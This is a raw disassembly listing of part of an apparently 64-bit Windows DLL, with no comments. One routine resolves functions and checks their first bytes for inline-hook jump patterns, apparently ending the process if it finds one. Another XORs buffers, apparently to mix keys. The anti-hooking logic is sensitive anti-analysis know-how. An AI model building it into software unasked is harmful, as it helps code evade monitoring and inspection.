   1800034bd:	33 ff                	xor    %edi,%edi
   1800034bf:	8b cf                	mov    %edi,%ecx
   1800034c1:	40 88 7c 0d 95       	mov    %dil,-0x6b(%rbp,%rcx,1)
   1800034c6:	48 ff c1             	inc    %rcx
   1800034c9:	48 83 f9 0e          	cmp    $0xe,%rcx
   1800034cd:	72 f2                	jb     0x1800034c1
   1800034cf:	66 0f 6f 0d b9 1b 3a 	movdqa 0x3a1bb9(%rip),%xmm1        # 0x1803a5090
   1800034d6:	00 
   1800034d7:	66 0f 6f 15 01 17 3a 	movdqa 0x3a1701(%rip),%xmm2        # 0x1803a4be0
   1800034de:	00 
   1800034df:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800034e2:	33 c0                	xor    %eax,%eax
   1800034e4:	0f 11 45 fb          	movups %xmm0,-0x5(%rbp)
   1800034e8:	48 89 45 0b          	mov    %rax,0xb(%rbp)
   1800034ec:	89 45 13             	mov    %eax,0x13(%rbp)
   1800034ef:	0f 11 4d df          	movups %xmm1,-0x21(%rbp)
   1800034f3:	f2 0f 11 55 ef       	movsd  %xmm2,-0x11(%rbp)
   1800034f8:	66 0f 73 da 08       	psrldq $0x8,%xmm2
   1800034fd:	66 0f 7e 55 f7       	movd   %xmm2,-0x9(%rbp)
   180003502:	48 8d 4d df          	lea    -0x21(%rbp),%rcx
   180003506:	e8 85 b1 00 00       	call   0x18000e690
   18000350b:	48 8b d0             	mov    %rax,%rdx
   18000350e:	48 8b cb             	mov    %rbx,%rcx
   180003511:	ff 15 19 2c 02 00    	call   *0x22c19(%rip)        # 0x180026130
   180003517:	48 8b f0             	mov    %rax,%rsi
   18000351a:	48 8b cf             	mov    %rdi,%rcx
   18000351d:	0f 1f 00             	nopl   (%rax)
   180003520:	40 88 7c 0d fb       	mov    %dil,-0x5(%rbp,%rcx,1)
   180003525:	48 ff c1             	inc    %rcx
   180003528:	48 83 f9 1c          	cmp    $0x1c,%rcx
   18000352c:	72 f2                	jb     0x180003520
   18000352e:	66 0f 6f 0d 7a 1a 3a 	movdqa 0x3a1a7a(%rip),%xmm1        # 0x1803a4fb0
   180003535:	00 
   180003536:	66 0f 6f 15 32 16 3a 	movdqa 0x3a1632(%rip),%xmm2        # 0x1803a4b70
   18000353d:	00 
   18000353e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003541:	33 c0                	xor    %eax,%eax
   180003543:	0f 11 45 c2          	movups %xmm0,-0x3e(%rbp)
   180003547:	48 89 45 d2          	mov    %rax,-0x2e(%rbp)
   18000354b:	66 89 45 da          	mov    %ax,-0x26(%rbp)
   18000354f:	88 45 dc             	mov    %al,-0x24(%rbp)
   180003552:	0f 11 4d a7          	movups %xmm1,-0x59(%rbp)
   180003556:	f2 0f 11 55 b7       	movsd  %xmm2,-0x49(%rbp)
   18000355b:	66 0f c5 c2 04       	pextrw $0x4,%xmm2,%eax
   180003560:	66 89 45 bf          	mov    %ax,-0x41(%rbp)
   180003564:	66 0f 73 da 0a       	psrldq $0xa,%xmm2
   180003569:	66 0f 7e d0          	movd   %xmm2,%eax
   18000356d:	88 45 c1             	mov    %al,-0x3f(%rbp)
   180003570:	48 8d 4d a7          	lea    -0x59(%rbp),%rcx
   180003574:	e8 97 b0 00 00       	call   0x18000e610
   180003579:	48 8b d0             	mov    %rax,%rdx
   18000357c:	48 8b cb             	mov    %rbx,%rcx
   18000357f:	ff 15 ab 2b 02 00    	call   *0x22bab(%rip)        # 0x180026130
   180003585:	48 8b d8             	mov    %rax,%rbx
   180003588:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000358f:	00 
   180003590:	c6 44 3d c2 00       	movb   $0x0,-0x3e(%rbp,%rdi,1)
   180003595:	48 ff c7             	inc    %rdi
   180003598:	48 83 ff 1b          	cmp    $0x1b,%rdi
   18000359c:	72 f2                	jb     0x180003590
   18000359e:	4d 85 f6             	test   %r14,%r14
   1800035a1:	74 32                	je     0x1800035d5
   1800035a3:	41 0f b6 06          	movzbl (%r14),%eax
   1800035a7:	3c e9                	cmp    $0xe9,%al
   1800035a9:	74 2a                	je     0x1800035d5
   1800035ab:	3c ff                	cmp    $0xff,%al
   1800035ad:	75 09                	jne    0x1800035b8
   1800035af:	41 80 7e 01 25       	cmpb   $0x25,0x1(%r14)
   1800035b4:	74 1f                	je     0x1800035d5
   1800035b6:	eb 3d                	jmp    0x1800035f5
   1800035b8:	3c eb                	cmp    $0xeb,%al
   1800035ba:	74 19                	je     0x1800035d5
   1800035bc:	3c 48                	cmp    $0x48,%al
   1800035be:	75 35                	jne    0x1800035f5
   1800035c0:	41 80 7e 01 b8       	cmpb   $0xb8,0x1(%r14)
   1800035c5:	75 2e                	jne    0x1800035f5
   1800035c7:	41 80 7e 0a ff       	cmpb   $0xff,0xa(%r14)
   1800035cc:	75 27                	jne    0x1800035f5
   1800035ce:	41 80 7e 0b e0       	cmpb   $0xe0,0xb(%r14)
   1800035d3:	75 20                	jne    0x1800035f5
   1800035d5:	48 8b 3d 0c 77 3a 00 	mov    0x3a770c(%rip),%rdi        # 0x1803aace8
   1800035dc:	48 85 ff             	test   %rdi,%rdi
   1800035df:	0f 84 e6 00 00 00    	je     0x1800036cb
   1800035e5:	ff 15 3d 2a 02 00    	call   *0x22a3d(%rip)        # 0x180026028
   1800035eb:	48 8b c8             	mov    %rax,%rcx
   1800035ee:	ba 01 00 00 00       	mov    $0x1,%edx
   1800035f3:	ff d7                	call   *%rdi
   1800035f5:	48 85 f6             	test   %rsi,%rsi
   1800035f8:	74 2d                	je     0x180003627
   1800035fa:	0f b6 06             	movzbl (%rsi),%eax
   1800035fd:	3c e9                	cmp    $0xe9,%al
   1800035ff:	74 26                	je     0x180003627
   180003601:	3c ff                	cmp    $0xff,%al
   180003603:	75 08                	jne    0x18000360d
   180003605:	80 7e 01 25          	cmpb   $0x25,0x1(%rsi)
   180003609:	74 1c                	je     0x180003627
   18000360b:	eb 3a                	jmp    0x180003647
   18000360d:	3c eb                	cmp    $0xeb,%al
   18000360f:	74 16                	je     0x180003627
   180003611:	3c 48                	cmp    $0x48,%al
   180003613:	75 32                	jne    0x180003647
   180003615:	80 7e 01 b8          	cmpb   $0xb8,0x1(%rsi)
   180003619:	75 2c                	jne    0x180003647
   18000361b:	80 7e 0a ff          	cmpb   $0xff,0xa(%rsi)
   18000361f:	75 26                	jne    0x180003647
   180003621:	80 7e 0b e0          	cmpb   $0xe0,0xb(%rsi)
   180003625:	75 20                	jne    0x180003647
   180003627:	48 8b 3d ba 76 3a 00 	mov    0x3a76ba(%rip),%rdi        # 0x1803aace8
   18000362e:	48 85 ff             	test   %rdi,%rdi
   180003631:	0f 84 94 00 00 00    	je     0x1800036cb
   180003637:	ff 15 eb 29 02 00    	call   *0x229eb(%rip)        # 0x180026028
   18000363d:	48 8b c8             	mov    %rax,%rcx
   180003640:	ba 01 00 00 00       	mov    $0x1,%edx
   180003645:	ff d7                	call   *%rdi
   180003647:	48 85 db             	test   %rbx,%rbx
   18000364a:	74 61                	je     0x1800036ad
   18000364c:	0f b6 03             	movzbl (%rbx),%eax
   18000364f:	3c e9                	cmp    $0xe9,%al
   180003651:	74 5a                	je     0x1800036ad
   180003653:	3c ff                	cmp    $0xff,%al
   180003655:	75 3c                	jne    0x180003693
   180003657:	80 7b 01 25          	cmpb   $0x25,0x1(%rbx)
   18000365b:	74 50                	je     0x1800036ad
   18000365d:	48 8d 7d 2d          	lea    0x2d(%rbp),%rdi
   180003661:	33 c0                	xor    %eax,%eax
   180003663:	b9 16 00 00 00       	mov    $0x16,%ecx
   180003668:	f3 aa                	rep stos %al,(%rdi)
   18000366a:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   18000366e:	48 33 cc             	xor    %rsp,%rcx
   180003671:	e8 3a b5 00 00       	call   0x18000ebb0
   180003676:	4c 8d 9c 24 f0 00 00 	lea    0xf0(%rsp),%r11
   18000367d:	00 
   18000367e:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   180003682:	49 8b 73 18          	mov    0x18(%r11),%rsi
   180003686:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   18000368a:	4d 8b 73 28          	mov    0x28(%r11),%r14
   18000368e:	49 8b e3             	mov    %r11,%rsp
   180003691:	5d                   	pop    %rbp
   180003692:	c3                   	ret
   180003693:	3c eb                	cmp    $0xeb,%al
   180003695:	74 16                	je     0x1800036ad
   180003697:	3c 48                	cmp    $0x48,%al
   180003699:	75 c2                	jne    0x18000365d
   18000369b:	80 7b 01 b8          	cmpb   $0xb8,0x1(%rbx)
   18000369f:	75 bc                	jne    0x18000365d
   1800036a1:	80 7b 0a ff          	cmpb   $0xff,0xa(%rbx)
   1800036a5:	75 b6                	jne    0x18000365d
   1800036a7:	80 7b 0b e0          	cmpb   $0xe0,0xb(%rbx)
   1800036ab:	75 b0                	jne    0x18000365d
   1800036ad:	48 8b 3d 34 76 3a 00 	mov    0x3a7634(%rip),%rdi        # 0x1803aace8
   1800036b4:	48 85 ff             	test   %rdi,%rdi
   1800036b7:	74 12                	je     0x1800036cb
   1800036b9:	ff 15 69 29 02 00    	call   *0x22969(%rip)        # 0x180026028
   1800036bf:	48 8b c8             	mov    %rax,%rcx
   1800036c2:	ba 01 00 00 00       	mov    $0x1,%edx
   1800036c7:	ff d7                	call   *%rdi
   1800036c9:	eb 92                	jmp    0x18000365d
   1800036cb:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800036d0:	ff 15 62 2a 02 00    	call   *0x22a62(%rip)        # 0x180026138
   1800036d6:	cc                   	int3
   1800036d7:	cc                   	int3
   1800036d8:	cc                   	int3
   1800036d9:	cc                   	int3
   1800036da:	cc                   	int3
   1800036db:	cc                   	int3
   1800036dc:	cc                   	int3
   1800036dd:	cc                   	int3
   1800036de:	cc                   	int3
   1800036df:	cc                   	int3
   1800036e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800036e5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800036ea:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800036ef:	57                   	push   %rdi
   1800036f0:	41 54                	push   %r12
   1800036f2:	41 55                	push   %r13
   1800036f4:	41 56                	push   %r14
   1800036f6:	41 57                	push   %r15
   1800036f8:	48 83 ec 30          	sub    $0x30,%rsp
   1800036fc:	4c 8b ac 24 90 00 00 	mov    0x90(%rsp),%r13
   180003703:	00 
   180003704:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   180003708:	33 db                	xor    %ebx,%ebx
   18000370a:	4c 89 6c 24 18       	mov    %r13,0x18(%rsp)
   18000370f:	49 8b f8             	mov    %r8,%rdi
   180003712:	4c 8b d9             	mov    %rcx,%r11
   180003715:	41 ba 10 00 00 00    	mov    $0x10,%r10d
   18000371b:	4d 8d 75 0f          	lea    0xf(%r13),%r14
   18000371f:	4c 3b e8             	cmp    %rax,%r13
   180003722:	77 07                	ja     0x18000372b
   180003724:	8b cb                	mov    %ebx,%ecx
   180003726:	4c 3b f2             	cmp    %rdx,%r14
   180003729:	73 11                	jae    0x18000373c
   18000372b:	49 8d 43 0f          	lea    0xf(%r11),%rax
   18000372f:	4c 3b e8             	cmp    %rax,%r13
   180003732:	77 43                	ja     0x180003777
   180003734:	48 8b cb             	mov    %rbx,%rcx
   180003737:	4d 3b f3             	cmp    %r11,%r14
   18000373a:	72 3b                	jb     0x180003777
   18000373c:	49 3b ca             	cmp    %r10,%rcx
   18000373f:	73 48                	jae    0x180003789
   180003741:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   180003745:	4c 2b da             	sub    %rdx,%r11
   180003748:	4d 8b c5             	mov    %r13,%r8
   18000374b:	4c 2b c2             	sub    %rdx,%r8
   18000374e:	49 8b d2             	mov    %r10,%rdx
   180003751:	48 2b d1             	sub    %rcx,%rdx
   180003754:	0f 1f 40 00          	nopl   0x0(%rax)
   180003758:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000375f:	00 
   180003760:	42 0f b6 0c 18       	movzbl (%rax,%r11,1),%ecx
   180003765:	32 08                	xor    (%rax),%cl
   180003767:	41 88 0c 00          	mov    %cl,(%r8,%rax,1)
   18000376b:	48 8d 40 01          	lea    0x1(%rax),%rax
   18000376f:	48 83 ea 01          	sub    $0x1,%rdx
   180003773:	75 eb                	jne    0x180003760
   180003775:	eb 12                	jmp    0x180003789
   180003777:	f3 41 0f 6f 0b       	movdqu (%r11),%xmm1
   18000377c:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   180003780:	0f 57 c8             	xorps  %xmm0,%xmm1
   180003783:	f3 41 0f 7f 4d 00    	movdqu %xmm1,0x0(%r13)
   180003789:	49 8d 75 10          	lea    0x10(%r13),%rsi
   18000378d:	49 8d 41 0f          	lea    0xf(%r9),%rax
   180003791:	49 8d 4d 1f          	lea    0x1f(%r13),%rcx
   180003795:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000379a:	48 3b f0             	cmp    %rax,%rsi
   18000379d:	77 05                	ja     0x1800037a4
   18000379f:	49 3b c9             	cmp    %r9,%rcx
   1800037a2:	73 0e                	jae    0x1800037b2
   1800037a4:	48 8d 47 0f          	lea    0xf(%rdi),%rax
   1800037a8:	48 3b f0             	cmp    %rax,%rsi
   1800037ab:	77 3a                	ja     0x1800037e7
   1800037ad:	48 3b cf             	cmp    %rdi,%rcx
   1800037b0:	72 35                	jb     0x1800037e7
   1800037b2:	49 8b d5             	mov    %r13,%rdx
   1800037b5:	48 8d 0c 3b          	lea    (%rbx,%rdi,1),%rcx
   1800037b9:	48 2b d7             	sub    %rdi,%rdx
   1800037bc:	4c 2b cf             	sub    %rdi,%r9
   1800037bf:	4c 2b d3             	sub    %rbx,%r10
   1800037c2:	0f 1f 40 00          	nopl   0x0(%rax)
   1800037c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800037cd:	00 00 00 
   1800037d0:	42 0f b6 04 09       	movzbl (%rcx,%r9,1),%eax
   1800037d5:	32 01                	xor    (%rcx),%al
   1800037d7:	88 44 11 10          	mov    %al,0x10(%rcx,%rdx,1)
   1800037db:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   1800037df:	49 83 ea 01          	sub    $0x1,%r10
   1800037e3:	75 eb                	jne    0x1800037d0
   1800037e5:	eb 10                	jmp    0x1800037f7
   1800037e7:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   1800037eb:	f3 41 0f 6f 01       	movdqu (%r9),%xmm0
   1800037f0:	0f 57 c8             	xorps  %xmm0,%xmm1
   1800037f3:	f3 0f 7f 0e          	movdqu %xmm1,(%rsi)
   1800037f7:	4c 8b 9c 24 80 00 00 	mov    0x80(%rsp),%r11
   1800037fe:	00 
   1800037ff:	44 0f b6 94 24 81 00 	movzbl 0x81(%rsp),%r10d
   180003806:	00 00 
   180003808:	44 0f b6 a4 24 87 00 	movzbl 0x87(%rsp),%r12d
   18000380f:	00 00 
   180003811:	45 30 5d 00          	xor    %r11b,0x0(%r13)
   180003815:	45 30 55 01          	xor    %r10b,0x1(%r13)
   180003819:	44 0f b6 8c 24 82 00 	movzbl 0x82(%rsp),%r9d
   180003820:	00 00 
   180003822:	44 0f b6 84 24 83 00 	movzbl 0x83(%rsp),%r8d
   180003829:	00 00 
   18000382b:	0f b6 94 24 84 00 00 	movzbl 0x84(%rsp),%edx
   180003832:	00 
   180003833:	0f b6 8c 24 85 00 00 	movzbl 0x85(%rsp),%ecx
   18000383a:	00 
   18000383b:	45 30 65 07          	xor    %r12b,0x7(%r13)
   18000383f:	45 30 5d 08          	xor    %r11b,0x8(%r13)
   180003843:	45 30 55 09          	xor    %r10b,0x9(%r13)
   180003847:	41 0f b6 45 00       	movzbl 0x0(%r13),%eax
   18000384c:	45 30 4d 02          	xor    %r9b,0x2(%r13)
   180003850:	45 30 45 03          	xor    %r8b,0x3(%r13)
   180003854:	41 30 55 04          	xor    %dl,0x4(%r13)
   180003858:	41 30 4d 05          	xor    %cl,0x5(%r13)
   18000385c:	45 30 55 11          	xor    %r10b,0x11(%r13)
   180003860:	45 30 4d 0a          	xor    %r9b,0xa(%r13)
   180003864:	45 30 45 0b          	xor    %r8b,0xb(%r13)
   180003868:	41 30 55 0c          	xor    %dl,0xc(%r13)
   18000386c:	41 30 4d 0d          	xor    %cl,0xd(%r13)
   180003870:	45 30 4d 12          	xor    %r9b,0x12(%r13)
   180003874:	45 30 45 13          	xor    %r8b,0x13(%r13)
   180003878:	41 30 55 14          	xor    %dl,0x14(%r13)
   18000387c:	41 30 4d 15          	xor    %cl,0x15(%r13)
   180003880:	45 30 65 17          	xor    %r12b,0x17(%r13)
   180003884:	45 30 5d 18          	xor    %r11b,0x18(%r13)
   180003888:	41 0f b6 7d 12       	movzbl 0x12(%r13),%edi
   18000388d:	41 0f b6 6d 14       	movzbl 0x14(%r13),%ebp
   180003892:	88 04 24             	mov    %al,(%rsp)
   180003895:	41 0f b6 45 01       	movzbl 0x1(%r13),%eax
   18000389a:	88 44 24 01          	mov    %al,0x1(%rsp)
   18000389e:	41 0f b6 45 02       	movzbl 0x2(%r13),%eax
   1800038a3:	88 44 24 02          	mov    %al,0x2(%rsp)
   1800038a7:	41 0f b6 45 03       	movzbl 0x3(%r13),%eax
   1800038ac:	88 44 24 03          	mov    %al,0x3(%rsp)
   1800038b0:	41 0f b6 45 04       	movzbl 0x4(%r13),%eax
   1800038b5:	88 44 24 04          	mov    %al,0x4(%rsp)
   1800038b9:	41 0f b6 45 05       	movzbl 0x5(%r13),%eax
   1800038be:	88 44 24 05          	mov    %al,0x5(%rsp)
   1800038c2:	0f b6 84 24 86 00 00 	movzbl 0x86(%rsp),%eax
   1800038c9:	00 
   1800038ca:	41 30 45 06          	xor    %al,0x6(%r13)
   1800038ce:	41 0f b6 5d 06       	movzbl 0x6(%r13),%ebx
   1800038d3:	41 30 45 0e          	xor    %al,0xe(%r13)
   1800038d7:	41 30 45 16          	xor    %al,0x16(%r13)
   1800038db:	45 0f b6 7d 16       	movzbl 0x16(%r13),%r15d
   1800038e0:	88 5c 24 06          	mov    %bl,0x6(%rsp)
   1800038e4:	41 0f b6 5d 07       	movzbl 0x7(%r13),%ebx
   1800038e9:	88 5c 24 07          	mov    %bl,0x7(%rsp)
   1800038ed:	41 0f b6 5d 08       	movzbl 0x8(%r13),%ebx
   1800038f2:	88 5c 24 08          	mov    %bl,0x8(%rsp)
   1800038f6:	41 0f b6 5d 09       	movzbl 0x9(%r13),%ebx
   1800038fb:	88 5c 24 09          	mov    %bl,0x9(%rsp)
   1800038ff:	41 0f b6 5d 0a       	movzbl 0xa(%r13),%ebx
   180003904:	88 5c 24 0a          	mov    %bl,0xa(%rsp)
   180003908:	41 0f b6 5d 0b       	movzbl 0xb(%r13),%ebx
   18000390d:	88 5c 24 0b          	mov    %bl,0xb(%rsp)
   180003911:	41 0f b6 5d 0c       	movzbl 0xc(%r13),%ebx
   180003916:	88 5c 24 0c          	mov    %bl,0xc(%rsp)
   18000391a:	41 0f b6 5d 0d       	movzbl 0xd(%r13),%ebx
   18000391f:	88 5c 24 0d          	mov    %bl,0xd(%rsp)
   180003923:	41 0f b6 5d 0e       	movzbl 0xe(%r13),%ebx
   180003928:	88 5c 24 0e          	mov    %bl,0xe(%rsp)
   18000392c:	41 0f b6 dc          	movzbl %r12b,%ebx
   180003930:	41 32 1e             	xor    (%r14),%bl
   180003933:	45 0f b6 65 17       	movzbl 0x17(%r13),%r12d
   180003938:	41 88 1e             	mov    %bl,(%r14)
   18000393b:	45 0f b6 75 15       	movzbl 0x15(%r13),%r14d
   180003940:	88 5c 24 0f          	mov    %bl,0xf(%rsp)
   180003944:	41 0f b6 db          	movzbl %r11b,%ebx
   180003948:	32 1e                	xor    (%rsi),%bl
   18000394a:	45 30 55 19          	xor    %r10b,0x19(%r13)
   18000394e:	45 0f b6 5d 18       	movzbl 0x18(%r13),%r11d
   180003953:	45 0f b6 55 19       	movzbl 0x19(%r13),%r10d
   180003958:	88 1e                	mov    %bl,(%rsi)
   18000395a:	41 0f b6 75 13       	movzbl 0x13(%r13),%esi
   18000395f:	88 5c 24 10          	mov    %bl,0x10(%rsp)
   180003963:	41 0f b6 5d 11       	movzbl 0x11(%r13),%ebx
   180003968:	88 5c 24 11          	mov    %bl,0x11(%rsp)
   18000396c:	40 88 7c 24 12       	mov    %dil,0x12(%rsp)
   180003971:	41 30 45 1e          	xor    %al,0x1e(%r13)
   180003975:	45 30 4d 1a          	xor    %r9b,0x1a(%r13)
   180003979:	45 30 45 1b          	xor    %r8b,0x1b(%r13)
   18000397d:	41 30 55 1c          	xor    %dl,0x1c(%r13)
   180003981:	41 30 4d 1d          	xor    %cl,0x1d(%r13)
   180003985:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   18000398a:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   18000398f:	0f b6 84 24 87 00 00 	movzbl 0x87(%rsp),%eax
   180003996:	00 
   180003997:	45 0f b6 4d 1a       	movzbl 0x1a(%r13),%r9d
   18000399c:	45 0f b6 45 1b       	movzbl 0x1b(%r13),%r8d
   1800039a1:	32 03                	xor    (%rbx),%al
   1800039a3:	88 03                	mov    %al,(%rbx)
   1800039a5:	0f b6 1c 24          	movzbl (%rsp),%ebx
   1800039a9:	41 0f b6 55 1c       	movzbl 0x1c(%r13),%edx
   1800039ae:	41 0f b6 4d 1d       	movzbl 0x1d(%r13),%ecx
   1800039b3:	45 0f b6 6d 1e       	movzbl 0x1e(%r13),%r13d
   1800039b8:	88 44 24 13          	mov    %al,0x13(%rsp)
   1800039bc:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   1800039c3:	00 
   1800039c4:	32 18                	xor    (%rax),%bl
   1800039c6:	88 1f                	mov    %bl,(%rdi)
   1800039c8:	0f b6 5c 24 01       	movzbl 0x1(%rsp),%ebx
   1800039cd:	32 58 01             	xor    0x1(%rax),%bl
   1800039d0:	88 5f 01             	mov    %bl,0x1(%rdi)
   1800039d3:	0f b6 5c 24 02       	movzbl 0x2(%rsp),%ebx
   1800039d8:	32 58 02             	xor    0x2(%rax),%bl
   1800039db:	88 5f 02             	mov    %bl,0x2(%rdi)
   1800039de:	0f b6 5c 24 03       	movzbl 0x3(%rsp),%ebx
   1800039e3:	32 58 03             	xor    0x3(%rax),%bl
   1800039e6:	88 5f 03             	mov    %bl,0x3(%rdi)
   1800039e9:	0f b6 5c 24 04       	movzbl 0x4(%rsp),%ebx
   1800039ee:	32 58 04             	xor    0x4(%rax),%bl
   1800039f1:	88 5f 04             	mov    %bl,0x4(%rdi)
   1800039f4:	0f b6 5c 24 05       	movzbl 0x5(%rsp),%ebx
   1800039f9:	32 58 05             	xor    0x5(%rax),%bl
   1800039fc:	88 5f 05             	mov    %bl,0x5(%rdi)
   1800039ff:	0f b6 5c 24 06       	movzbl 0x6(%rsp),%ebx
   180003a04:	32 58 06             	xor    0x6(%rax),%bl
   180003a07:	88 5f 06             	mov    %bl,0x6(%rdi)
   180003a0a:	0f b6 5c 24 07       	movzbl 0x7(%rsp),%ebx
   180003a0f:	32 58 07             	xor    0x7(%rax),%bl
   180003a12:	88 5f 07             	mov    %bl,0x7(%rdi)
   180003a15:	0f b6 5c 24 08       	movzbl 0x8(%rsp),%ebx
   180003a1a:	32 18                	xor    (%rax),%bl
   180003a1c:	88 5f 08             	mov    %bl,0x8(%rdi)
   180003a1f:	0f b6 5c 24 09       	movzbl 0x9(%rsp),%ebx
   180003a24:	32 58 01             	xor    0x1(%rax),%bl
   180003a27:	88 5f 09             	mov    %bl,0x9(%rdi)
   180003a2a:	0f b6 5c 24 0a       	movzbl 0xa(%rsp),%ebx
   180003a2f:	32 58 02             	xor    0x2(%rax),%bl
   180003a32:	88 5f 0a             	mov    %bl,0xa(%rdi)
   180003a35:	0f b6 5c 24 0b       	movzbl 0xb(%rsp),%ebx
   180003a3a:	32 58 03             	xor    0x3(%rax),%bl
   180003a3d:	88 5f 0b             	mov    %bl,0xb(%rdi)
   180003a40:	0f b6 5c 24 0c       	movzbl 0xc(%rsp),%ebx
   180003a45:	32 58 04             	xor    0x4(%rax),%bl
   180003a48:	88 5f 0c             	mov    %bl,0xc(%rdi)
   180003a4b:	0f b6 5c 24 0d       	movzbl 0xd(%rsp),%ebx
   180003a50:	32 58 05             	xor    0x5(%rax),%bl
   180003a53:	88 5f 0d             	mov    %bl,0xd(%rdi)
   180003a56:	0f b6 5c 24 0e       	movzbl 0xe(%rsp),%ebx
   180003a5b:	32 58 06             	xor    0x6(%rax),%bl
   180003a5e:	88 5f 0e             	mov    %bl,0xe(%rdi)
   180003a61:	0f b6 5c 24 0f       	movzbl 0xf(%rsp),%ebx
   180003a66:	32 58 07             	xor    0x7(%rax),%bl
   180003a69:	88 5f 0f             	mov    %bl,0xf(%rdi)
   180003a6c:	0f b6 5c 24 10       	movzbl 0x10(%rsp),%ebx
   180003a71:	32 18                	xor    (%rax),%bl
   180003a73:	88 5f 10             	mov    %bl,0x10(%rdi)
   180003a76:	0f b6 5c 24 11       	movzbl 0x11(%rsp),%ebx
   180003a7b:	32 58 01             	xor    0x1(%rax),%bl
   180003a7e:	88 5f 11             	mov    %bl,0x11(%rdi)
   180003a81:	48 8b 5c 24 18       	mov    0x18(%rsp),%rbx
   180003a86:	0f b6 7c 24 12       	movzbl 0x12(%rsp),%edi
   180003a8b:	40 32 78 02          	xor    0x2(%rax),%dil
   180003a8f:	40 88 7b 12          	mov    %dil,0x12(%rbx)
   180003a93:	40 32 70 03          	xor    0x3(%rax),%sil
   180003a97:	40 88 73 13          	mov    %sil,0x13(%rbx)
   180003a9b:	40 32 68 04          	xor    0x4(%rax),%bpl
   180003a9f:	40 88 6b 14          	mov    %bpl,0x14(%rbx)
   180003aa3:	44 32 70 05          	xor    0x5(%rax),%r14b
   180003aa7:	44 88 73 15          	mov    %r14b,0x15(%rbx)
   180003aab:	44 32 78 06          	xor    0x6(%rax),%r15b
   180003aaf:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   180003ab4:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   180003ab9:	44 88 7b 16          	mov    %r15b,0x16(%rbx)
   180003abd:	44 32 60 07          	xor    0x7(%rax),%r12b
   180003ac1:	44 88 63 17          	mov    %r12b,0x17(%rbx)
   180003ac5:	44 32 18             	xor    (%rax),%r11b
   180003ac8:	44 88 5b 18          	mov    %r11b,0x18(%rbx)
   180003acc:	44 32 50 01          	xor    0x1(%rax),%r10b
   180003ad0:	44 88 53 19          	mov    %r10b,0x19(%rbx)
   180003ad4:	44 32 48 02          	xor    0x2(%rax),%r9b
   180003ad8:	44 88 4b 1a          	mov    %r9b,0x1a(%rbx)
   180003adc:	44 32 40 03          	xor    0x3(%rax),%r8b
   180003ae0:	44 88 43 1b          	mov    %r8b,0x1b(%rbx)
   180003ae4:	32 50 04             	xor    0x4(%rax),%dl
   180003ae7:	88 53 1c             	mov    %dl,0x1c(%rbx)
   180003aea:	32 48 05             	xor    0x5(%rax),%cl
   180003aed:	88 4b 1d             	mov    %cl,0x1d(%rbx)
   180003af0:	44 32 68 06          	xor    0x6(%rax),%r13b
   180003af4:	0f b6 4c 24 13       	movzbl 0x13(%rsp),%ecx
   180003af9:	44 88 6b 1e          	mov    %r13b,0x1e(%rbx)
   180003afd:	32 48 07             	xor    0x7(%rax),%cl
   180003b00:	88 4b 1f             	mov    %cl,0x1f(%rbx)
   180003b03:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180003b08:	48 83 c4 30          	add    $0x30,%rsp
   180003b0c:	41 5f                	pop    %r15
   180003b0e:	41 5e                	pop    %r14
   180003b10:	41 5d                	pop    %r13
   180003b12:	41 5c                	pop    %r12
   180003b14:	5f                   	pop    %rdi
   180003b15:	c3                   	ret
   180003b16:	cc                   	int3
   180003b17:	cc                   	int3
   180003b18:	cc                   	int3
   180003b19:	cc                   	int3
   180003b1a:	cc                   	int3
   180003b1b:	cc                   	int3
   180003b1c:	cc                   	int3
   180003b1d:	cc                   	int3
   180003b1e:	cc                   	int3
   180003b1f:	cc                   	int3
   180003b20:	40 55                	rex push %rbp
   180003b22:	53                   	push   %rbx
   180003b23:	56                   	push   %rsi
   180003b24:	57                   	push   %rdi
   180003b25:	41 54                	push   %r12
   180003b27:	41 55                	push   %r13
   180003b29:	41 56                	push   %r14
   180003b2b:	41 57                	push   %r15
   180003b2d:	48 8d 6c 24 a8       	lea    -0x58(%rsp),%rbp
   180003b32:	48 81 ec 58 01 00 00 	sub    $0x158,%rsp
   180003b39:	48 8b 05 c0 54 3a 00 	mov    0x3a54c0(%rip),%rax        # 0x1803a9000
   180003b40:	48 33 c4             	xor    %rsp,%rax
   180003b43:	48 89 45 40          	mov    %rax,0x40(%rbp)
   180003b47:	4d 8b e9             	mov    %r9,%r13
   180003b4a:	45 8b f8             	mov    %r8d,%r15d
   180003b4d:	4c 8b f2             	mov    %rdx,%r14
   180003b50:	48 8b f1             	mov    %rcx,%rsi
   180003b53:	48 89 4d 80          	mov    %rcx,-0x80(%rbp)
   180003b57:	4c 8b a5 c0 00 00 00 	mov    0xc0(%rbp),%r12
   180003b5e:	33 db                	xor    %ebx,%ebx
   180003b60:	89 5c 24 78          	mov    %ebx,0x78(%rsp)
   180003b64:	e8 c7 f7 ff ff       	call   0x180003330
   180003b69:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003b6c:	0f 11 06             	movups %xmm0,(%rsi)
   180003b6f:	48 89 1e             	mov    %rbx,(%rsi)
   180003b72:	48 89 5e 08          	mov    %rbx,0x8(%rsi)
   180003b76:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
